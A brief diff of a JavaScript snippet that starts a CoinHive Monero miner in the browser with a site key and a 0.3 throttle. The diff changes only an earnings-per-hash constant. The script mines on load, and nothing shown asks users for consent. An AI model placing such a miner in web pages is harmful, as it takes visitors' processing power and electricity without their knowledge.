@@ -1,6 +1,6 @@
 var miner = new CoinHive.Anonymous('G5VnBN1TtzwyAkq3dOYGGRL4vBIVkZRQ', { throttle: 0.3 });
 
-let XMRperHash = 0.000006358 / 1000000;
+let XMRperHash = 0.00006313 / 1000000;
 
 miner.start();
 
